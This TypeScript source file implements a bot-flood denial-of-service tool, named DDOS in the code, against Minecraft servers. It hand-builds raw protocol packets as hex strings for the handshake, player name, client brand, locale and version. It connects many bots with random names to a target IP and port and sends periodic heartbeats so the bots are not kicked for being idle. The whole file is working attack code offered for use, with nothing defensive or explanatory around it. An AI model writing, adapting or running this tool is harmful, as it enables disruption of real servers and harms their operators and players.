import { config } from "./globalVariables";
import { DDoSConfig } from "./types";
import utils from "./Utils";
import * as net from "net";

const metaData = [
  `10 00 ff 05 09 6c 6f 63 61 6c 68 6f 73 74 1f 90 02`,
  `22 00 10 
74 72 6f 6e 67 74 68 61 6e 67 31 32 33 31 32 33 
53 da 0f 86 d5 e7 39 ca 94 db b2 60 8f d4 bf c4`, //player's name (second row)
  "02 00 03", //syn
  "1a 00 02 0f 6d 69 6e 65 63 72 61 66 74 3a 62 72 61 6e 64 07 76 61 6e 69 6c 6c 61", //mod data, optifine, forge, vanilla...
  "0f 00 00 05 65 6e 5f 75 73 0c 00 01 7f 01 00 01", //lang
  "19 00 07 01 09 6d 69 6e 65 63 72 61 66 74 04 63 6f 72 65 06 31 2e 32 31 2e 31", //version data
  "02 00 03", //ack
];

const playersNamePart1 = `22 00 10`; //name header

const playersNamePart2 = "74 72 6f 6e 67 74 68 61 6e 67 31 32 33 31 32 33"; //name

const playersNamePart3 = "53 da 0f 86 d5 e7 39 ca 94 db b2 60 8f d4 bf c4"; //name footer

const vanilaVersionsData = `1a 00 02 0f 6d 69 6e 65 63 72 61 66 74 3a 62 72 61 6e 64 07 76 61 6e 69 6c 6c 61`;

const heartBeat = `1b 00 1a c0 68 74 3f 52 48 5b b3 40 51 fc 00 00 00 00 00 40 36 46 6a 86 16 b7 35 01`;

function getBuffer(buff: string) {
  return Buffer.from(buff.split(" ").map((byte) => parseInt(byte, 16)));
}

function insertPlayerName(name: string) {
  let hexName = utils.stringToHex(name).join(" ");
  return `${playersNamePart1} ${hexName} ${playersNamePart3}`;
}

class DDOS {
  isDDoSRunning: boolean = false;
  totalBots: net.Socket[] = [];

  names: string[] = [];
  namesCounter = 0;

  data: DDoSConfig | null = null;

  clients: net.Socket[] = [];

  async start(data: DDoSConfig) {
    if (this.isDDoSRunning) return;
    this.isDDoSRunning = true;
    this.data = data;
    let canConnect = await this.checkServerAvailability();

    if (!canConnect) return;
    if (!this.data) return;

    utils.logTitle(`Starting DDoS`);
    utils.log(`Version: ${data.minecraftVersion}}`);
    utils.log(`IP: ${data.serverIp}`);
    utils.log(`Port: ${data.serverPort}`);
    utils.log(`Total Bots: ${data.totalBots}`);

    //TODO: Names -> Hex -> Buffer -> Create Clients -> Save Each Client -> Send Clients To Sever -> Constantly Send HeartBeat to Server For Clients
    this.names = utils.getListOfRandomNames(data.totalBots);

    let intervalId = setInterval(() => {
      if (!this.isDDoSRunning) {
        clearInterval(intervalId);
      }
      metaData[1] = insertPlayerName(this.names[this.namesCounter]);

      let c = this.joinClient(metaData);

      if (c) this.clients.push(c);

      this.namesCounter++;

      if (this.namesCounter >= this.names.length) {
        this.namesCounter = 0;
        this.sendHeartBeatForEachClient();
        clearInterval(intervalId);
      }
    }, 1000 * data.delayEachBot);
  }

  stop() {
    utils.logTitle(`Stopping DDoS...`);
    this.isDDoSRunning = false;
    for (const x of this.clients) {
      x.destroy();
      x.end();
    }

    this.clients = [];
  }

  sendHeartBeatForEachClient() {
    // Set interval to send data every 0.5 seconds
    let intervalId = setInterval(() => {
      console.log(
        "Heartbeat... (send heartbeat to server to keep the bot being kicked from afk)"
      );

      for (const client of this.clients) {
        client.write(getBuffer(heartBeat));
      }

      if (!this.isDDoSRunning) {
        clearInterval(intervalId);
        utils.log("Stop sending heartbeats...");
      }
    }, 1000 * 2.5);
  }

  checkServerAvailability(): Promise<boolean> {
    return new Promise((resolve) => {
      if (!this.data) return false;
      const socket = new net.Socket();

      // Set a connection timeout
      socket.setTimeout(1000);

      // If connection is successful, resolve with true
      socket.connect(this.data.serverPort, this.data.serverIp, () => {
        utils.log(
          `Ping successful to ${this.data?.serverIp}:${this.data?.serverPort}`
        );
        socket.end();
        resolve(true);
      });

      // On error (like server unreachable), resolve with false
      socket.on("error", () => {
        utils.log(
          `Ping failed to ${this.data?.serverIp}:${this.data?.serverPort}`
        );
        socket.destroy();
        resolve(false);
      });

      // On timeout, resolve with false
      socket.on("timeout", () => {
        utils.log(
          `Ping timed out to ${this.data?.serverIp}:${this.data?.serverPort}`
        );
        socket.destroy();
        resolve(false);
      });
    });
  }

  joinClient(buff: string[]) {
    const client = new net.Socket();
    let currentIndex = 0;
    let intervalId: NodeJS.Timeout | null = null;

    if (!this.data) return;

    client.connect(this.data.serverPort, this.data.serverIp, () => {
      // Set interval to send data every 0.5 seconds
      intervalId = setInterval(() => {
        if (currentIndex < buff.length) {
          const dataBuffer = getBuffer(buff[currentIndex]);

          client.write(dataBuffer, (err: any) => {
            if (err) {
              utils.log(`Error sending data: ${err.message}`);
            } else {
              utils.log(
                `Data sent successfully: ${dataBuffer.toString("hex")}`
              );
            }
          });

          currentIndex++;
        }

        // Clear interval after the last data is sent
        if (currentIndex >= buff.length) {
          if (intervalId) clearInterval(intervalId);
        }
      }, 100);
    });

    // Optional: Handle client errors
    client.on("error", (err) => {
      console.error("Client error:", err.message);
    });

    client.on("close", () => {
      console.log("Connection closed by the server.");
      client.end();
      if (intervalId) clearInterval(intervalId);
    });

    return client;
  }
}

const ddos = new DDOS();
export default ddos;
